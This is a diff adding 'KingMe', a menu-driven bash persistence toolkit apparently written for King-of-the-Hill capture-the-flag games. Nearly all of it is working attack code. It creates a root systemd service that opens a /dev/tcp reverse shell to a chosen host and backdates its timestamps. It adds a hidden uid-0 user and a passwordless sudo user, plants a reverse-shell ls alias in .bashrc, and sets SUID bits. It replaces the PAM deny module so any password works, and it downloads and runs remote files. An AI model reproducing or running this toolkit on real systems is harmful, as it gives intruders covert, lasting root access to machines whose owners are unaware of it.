@@ -1,0 +1,490 @@
+#! /bin/bash
+# KingMe - (KM)
+# By Trapnatized
+
+# Gets dimensions of terminal
+# w=$(tput cols)
+# h=$(tput lines)
+# cw=$(( $w / 2 ))
+# ch=$(( $h / 2 ))
+
+
+
+# Colors & Symbols
+RST="\033[0m"
+RED="\033[1;31m"
+GRN="\033[1;32m"
+YEL="\033[1;33m"
+HLT="\033[1;43m"
+BLU="\033[1;34m"
+KC="\U0001F451"
+TL="\U0001F527"
+SA="\U0001F4AA"
+PO="\U0001F4A9"
+MF="\U0001F595"
+SK="\U0001F480"
+TR="\U0001F608"
+FR="\U0001F525"
+TB="\U0001F950"
+
+
+
+# colormenu() {
+#   local text=$1
+#   echo -e "${GRN}$text"
+# }
+
+
+# Systemd root backdoor
+systemdRoot() {
+echo -e "${YEL} Root Systemd Backdoor... ${RST}"
+echo -e "What do you want to name your service?"
+read name
+
+echo -e "Enter LHOST"
+read lhost
+
+echo -e "Enter LPORT"
+read lport
+
+cat << EOF > /etc/systemd/system/$name.service
+[Unit]
+Description=$name service
+
+[Service]
+User=root
+Group=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1' 
+Restart=always
+RestartSec=5
+StandardOutout=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+touch -r /etc/systemd/system/getty.target.wants /etc/systemd/system/$name.service
+systemctl daemon-reload >/dev/null
+systemctl enable $name.service >/dev/null 2>&1
+systemctl start $name.service >/dev/null
+touch -d '123 days ago' /etc/systemd/system/$name.service
+echo -e "${RED}${HLT} [+] Systemd Installed ... ${RST}"
+}
+
+# Create new user & add to sudoers
+userAdd() {
+echo -e "${YEL} Creating New User... ${RST}"
+echo "Enter Username:"
+read name
+echo "Enter Password:"
+read pass
+
+useradd  -m -s /bin/bash $name && echo "$name    ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
+echo -e "$pass\n$pass" | passwd $name
+echo -e "${RED}${HLT} [+] $name:$pass (sudo su) ... ${RST}"
+}
+
+
+# Create root user in /etc/passwd & /etc/shadow using sed
+# system:pass123
+systemUser() {
+echo -e "${YEL} Creating Root User using sed... ${RST}"
+sed -i 's|^sys:|system:x:0:0::/root:/bin/sh\nsys:|g' /etc/passwd
+sed -i 's|^sys:|system:$1$system$rAGRVf5p2jYTqtqOW5cPu/:18511:0:99999:7:::\nsys:|g' /etc/shadow
+echo -e "${RED}${HLT} [+] system:pass123 ${RST}"
+}
+
+# Create an alias in .bashrc
+bashrc() {
+echo -e "${YEL} Creating .bashrc Alias... ${RST}"
+echo "Enter LHOST"
+read lhost
+echo "Enter LPORT"
+read lport
+echo "alias ls='(bash -i >& /dev/tcp/$lhost/$lport 0>&1 & disown) 2>/dev/null; ls --color=auto'" >> /root/.bashrc && source /root/.bashrc
+echo -e "${RED}${HLT} [+] Alias Created  ${RST}"
+}
+# create SUID backdoor
+suid() {
+echo -e "${YEL} SUID Backdoor... ${RST}"
+echo "Which SUID"
+read suid
+chmod +s $(which $suid)
+echo -e "${RED}${HLT}[+] $suid suid set ...${RST} "
+}
+
+# adding PAM backdoor for all access / no password 
+pam() {
+echo -e "${YEL} Creating PAM Backdoor ... ${RST}"
+cd  /lib/x86_64-linux-gnu/security/ && cp pam_deny.so pam_denyd.so && rm -f pam_deny.so && cp pam_permit.so pam_deny.so && cd / 
+echo -e "${RED}${HLT}[+] Any User / Any Password ${RST}"
+}
+
+scripts() {
+
+echo "Enter LHOST"
+read lhost
+echo "Enter LPORT"
+read lport
+echo "Which file?"
+read file
+echo -e "${YEL} Downloading Tools...${RST}"
+wget $lhost:$lport/$file && chmod +x $file && ./$file
+sleep 3
+echo -e "${YEL}Cleaning up...${RST}"
+rm -f $file
+}
+
+
+#all
+all() {
+  systemdRoot
+  userAdd
+  systemUser
+  bashrc
+  suid
+}
+
+# Backup of certain bins incase of rm-rf /
+copyBin(){
+  cp $(which koth) . 2>/tmp/test
+  cp $(which systemctl) . 
+  cp $(which sed) . && mv sed s
+  cp $(which chattr) . && mv chattr c
+  cp $(which lsattr) . && mv lsattr l
+  cp $(which mount) . && mv mount m
+  cp $(which umount) . && mv umount u
+  cp $(which wget) . && mv wget w
+  cp $(which chmod) . && mv chmod mod
+  cp $(which ln) .
+}
+
+copyTools() {
+  echo "where do you want to hide your tool folder?... (ex: /bin):"
+  read pwd
+  echo "Name your tool folder:"
+  read dir
+  mkdir $pwd/$dir
+  cd $pwd/$dir
+  copyBin
+  cd .. && $dir/c +ia $dir
+}
+
+kingMe1(){
+  #infinite unmount, unlock, read/writeable, unclobber, replace king, lock.
+  echo "Enter King name"
+  read kng
+  wd=$pwd/$dir
+  kf=/root/king.txt
+  
+  if [ ! -s $kf ] || [ ! -f $kf ]; then
+    $wd/c -ia $kf &>/tmp/debug
+    echo "king" > $kf
+      while true;do
+        $wd/u -l $kf &> /tmp/debug
+        $wd/c -ia /root &> /tmp/debug
+        $wd/c -ia $kf &> /tmp/debug
+        $wd/mod 666 $kf &> /tmp/debug
+        set +o noclobber $kf &> /tmp/debug
+        $wd/s -i "s/.*/$kng/g" $kf &> /tmp/debug
+        $wd/c +ia $kf &> /tmp/debug
+        sleep 0.1
+      done &
+  else
+    while true;do
+      $wd/u -l $kf &> /tmp/debug
+      $wd/c -ia /root &> /tmp/debug
+      $wd/c -ia $kf &> /tmp/debug
+      $wd/mod 666 $kf &> /tmp/debug
+      set +o noclobber $kf &> /tmp/debug
+      $wd/s -i "s/.*/$kng/g" $kf &> /tmp/debug
+      $wd/c +ia $kf &> /tmp/debug
+      sleep 0.1
+    done &
+  fi
+}
+
+logo() {
+echo '
+
+   ▄█   ▄█▄  ▄█  ███▄▄▄▄      ▄██████▄  
+  ███ ▄███▀ ███  ███▀▀▀██▄   ███    ███ 
+  ███▐██▀   ███▌ ███   ███   ███    █▀  
+ ▄█████▀    ███▌ ███   ███  ▄███        
+▀▀█████▄    ███▌ ███   ███ ▀▀███ ████▄  
+  ███▐██▄   ███  ███   ███   ███    ███ 
+  ███ ▀███▄ ███  ███   ███   ███    ███ 
+  ███   ▀█▀ █▀    ▀█   █▀    ████████▀  
+  ▀                                     
+       ▄▄▄▄███▄▄▄▄      ▄████████       
+     ▄██▀▀▀███▀▀▀██▄   ███    ███       
+     ███   ███   ███   ███    █▀        
+     ███   ███   ███  ▄███▄▄▄           
+     ███   ███   ███ ▀▀███▀▀▀           
+     ███   ███   ███   ███    █▄        
+     ███   ███   ███   ███    ███       
+      ▀█   ███   █▀    ██████████    v0.1
+
+                           By Trapnatized                                            
+'                                                                                           
+}
+
+
+
+# Main Menu
+menu() {
+logo
+
+
+    #cat << EOF  
+echo -e " 
+    $KC      ${YEL}MAIN MENU${RST}    $KC
+
+
+  ${GRN}[01]${RST} Persistence                ${GRN}[04]${RST} Trolls
+  ${GRN}[02]${RST} Tools                      ${GRN}[05]${RST} ...
+  ${GRN}[03]${RST} Kingme                     ${GRN}[06]${RST} ...
+
+
+    ${RED}[*]${RST}     ${RED}[99]${RST} Exit    ${RED}[*]${RST}
+
+"
+#EOF
+
+    printf "${RST}[K1NG-M3]~${KC} "
+    read INPUT
+    
+    if [ "$INPUT" == "99" ]; then
+      echo -e "${RED}[-] Exiting.. ${RST}"
+      exit 1
+    elif [ "$INPUT" == "1" ] || [ "$INPUT" == "01" ]; then
+      clear
+      pMenu
+    elif [ "$INPUT" == "2" ] || [ "$INPUT" == "02" ]; then
+      clear
+      tMenu
+    elif [ "$INPUT" == "3" ] || [ "$INPUT" == "03" ]; then
+      clear
+      kMenu
+    elif [ "$INPUT" == "4" ] || [ "$INPUT" == "04" ]; then
+      clear
+      TMenu
+    else
+      echo -e "${RED}This option does not exist${RST}"
+    fi
+}
+
+
+# Kingme Menu
+kMenu() {
+logo
+    #cat << EOF       
+echo -e "
+    $KC      ${YEL}KING MENU${RST}    $KC
+
+
+  ${GRN}[01]${RST} KingMe                     ${GRN}[04]${RST} ...
+  ${GRN}[02]${RST} ...                        ${GRN}[05]${RST} ...
+  ${GRN}[03]${RST} ...                        ${GRN}[06]${RST} ...
+
+
+    ${YEL}[*]${RST}     ${YEL}[00]${RST} ../     ${YEL}[*]${RST}  
+    ${RED}[*]${RST}     ${RED}[99]${RST} Exit    ${RED}[*]${RST}
+"
+#EOF
+
+    printf "${RST}[K1NG-M3]~${KC} "
+    read INPUT
+    
+    if [ "$INPUT" == "99" ]; then
+      echo -e "${RED}[-] Exiting.. ${RST}"
+      exit 1
+    elif [ "$INPUT" == "0" ] || [ "$INPUT" == "00" ]; then
+      clear
+      menu    
+    elif [ "$INPUT" == "1" ] || [ "$INPUT" == "01" ]; then
+      kingMe1
+      sleep .3
+      echo -e "${KC}  ${GRN}[+]King is now: ${RST} $(cat $kf)"
+      sleep .5
+      clear
+      kMenu
+    #elif [ "$INPUT"  "2" ] || [ "$INPUT" == "02" ]; then
+     # tMenu
+    #elif [ "$INPUT" == "3" ] || [ "$INPUT" == "03" ]; then
+     # kMenu
+    else
+      echo -e "${RED}This option does not exist${RST}"
+    fi
+}
+
+
+# Persistence Menu
+pMenu() {
+logo
+    #cat << EOF   
+echo -e "
+    $FR      ${YEL}PERSISTENCE MENU${RST}    $FR
+
+
+  ${GRN}[01]${RST} Systemd Service            ${GRN}[04]${RST} Bashrc Alias
+  ${GRN}[02]${RST} New Sudo User              ${GRN}[05]${RST} SUID
+  ${GRN}[03]${RST} Root System User           ${GRN}[06]${RST} PAM
+                                  ${GRN}[07]${RST} ALL 
+
+    ${YEL}[*]${RST} More coming soon ${YEL}[*]${RST}
+    ${YEL}[*]${RST}     ${YEL}[00]${RST} ../     ${YEL}[*]${RST}
+    ${RED}[*]${RST}     ${RED}[99]${RST} Exit    ${RED}[*]${RST}
+"
+#EOF
+
+    printf "${RST}[K1NG-M3]~${SA} "
+
+    read INPUT
+    if [ "$INPUT" == "99" ]; then
+        echo -e "${RED} Exiting... ${RST}"
+        exit 1
+    elif [ "$INPUT" == "0" ] || [ "$INPUT" == "00" ]; then
+        clear
+        menu
+    elif [ "$INPUT" == "1" ] || [ "$INPUT" == "01" ]; then
+        systemdRoot
+        sleep .3
+        clear
+        pMenu
+    elif [ "$INPUT" == "2" ] || [ "$INPUT" == "02" ]; then
+        userAdd
+        sleep .3
+        clear
+        pMenu
+    elif [ "$INPUT" == "3" ] || [ "$INPUT" == "03" ]; then
+        systemUser
+        sleep .3
+        clear
+        pMenu
+    elif [ "$INPUT" == "4" ] || [ "$INPUT" == "04" ]; then
+        bashrc
+        sleep .3
+        clear
+        pMenu
+    elif [ "$INPUT" == "5" ] || [ "$INPUT" == "05" ]; then
+        suid
+        sleep .3
+        clear
+        pMenu
+    elif [ "$INPUT" == "6" ] || [ "$INPUT" == "06" ]; then
+        pam
+        sleep .3
+        clear
+        pMenu
+    elif [ "$INPUT" == "7" ] || [ "$INPUT" == "07" ]; then
+        all
+        sleep .3
+        clear
+        pMenu
+    else    
+        echo -e "${RED}This option does not exist${RST}"
+    fi
+}
+
+# Tools Menu
+tMenu() {
+logo
+    #cat << EOF       
+echo -e "
+    $TL      ${YEL}TOOL MENU${RST}    $TL
+
+
+  ${GRN}[01]${RST} Backup                     ${GRN}[04]${RST} ...
+  ${GRN}[02]${RST} B.Y.O                      ${GRN}[05]${RST} ...
+  ${GRN}[03]${RST} ...                        ${GRN}[06]${RST} ...
+
+
+    ${YEL}[*]${RST}     ${YEL}[00]${RST} ../     ${YEL}[*]${RST}  
+    ${RED}[*]${RST}     ${RED}[99]${RST} Exit    ${RED}[*]${RST}
+"
+#EOF
+
+    printf "${RST}[K1NG-M3]~${TL} "
+    read INPUT
+    
+    if [ "$INPUT" == "99" ]; then
+      echo -e "${RED}[-] Exiting.. ${RST}"
+      exit 1
+    elif [ "$INPUT" == "0" ] || [ "$INPUT" == "00" ]; then
+      clear
+      menu    
+    elif [ "$INPUT" == "1" ] || [ "$INPUT" == "01" ]; then
+      copyTools
+      echo -e "${GRN}[+]copied tools${RST}"
+      sleep .5
+      clear
+      tMenu
+    elif [ "$INPUT"  "2" ] || [ "$INPUT" == "02" ]; then
+      scripts
+      echo -e "${GRN}[+]copied script${RST}"
+      sleep .5
+      clear
+      tMenu
+    #elif [ "$INPUT" == "3" ] || [ "$INPUT" == "03" ]; then
+     # kMenu
+    else
+      echo -e "${RED}This option does not exist${RST}"
+    fi
+}
+
+# Trolls Menu
+TMenu() {
+logo
+    #cat << EOF       
+echo -e "
+    $MF      ${YEL}TROLL MENU${RST}    $MF
+
+
+  ${GRN}[01]${RST} Scripts                    ${GRN}[04]${RST} ...
+  ${GRN}[02]${RST} Games                      ${GRN}[05]${RST} ...
+  ${GRN}[03]${RST} Other                      ${GRN}[06]${RST} ...
+
+    ${YEL}[*]${RST}     Coming Soon...           ${YEL}[*]${RST}
+    ${YEL}[*]${RST}     ${YEL}[00]${RST} ../     ${YEL}[*]${RST}  
+    ${RED}[*]${RST}     ${RED}[99]${RST} Exit    ${RED}[*]${RST}
+"
+#EOF
+
+    printf "${RST}[K1NG-M3]~${PO} "
+    read INPUT
+    
+    if [ "$INPUT" == "99" ]; then
+      echo -e "${RED}[-] Exiting.. ${RST}"
+      exit 1
+    elif [ "$INPUT" == "0" ] || [ "$INPUT" == "00" ]; then
+      clear
+      menu    
+    #elif [ "$INPUT" == "1" ] || [ "$INPUT" == "01" ]; then
+      #script
+    #elif [ "$INPUT"  "2" ] || [ "$INPUT" == "02" ]; then
+     # tMenu
+    #elif [ "$INPUT" == "3" ] || [ "$INPUT" == "03" ]; then
+     # kMenu
+    else
+      echo -e "${RED}This option does not exist${RST}"
+    fi
+}
+
+# Main Program func
+main() {
+  if [[ $(id -u) -ne "0" ]]; then
+    echo -e "${RED}[${SK}] Run as Root... ${RST}" >&2
+    exit 1
+  fi
+
+  clear
+  menu
+}
+
+main
+
+
+
+
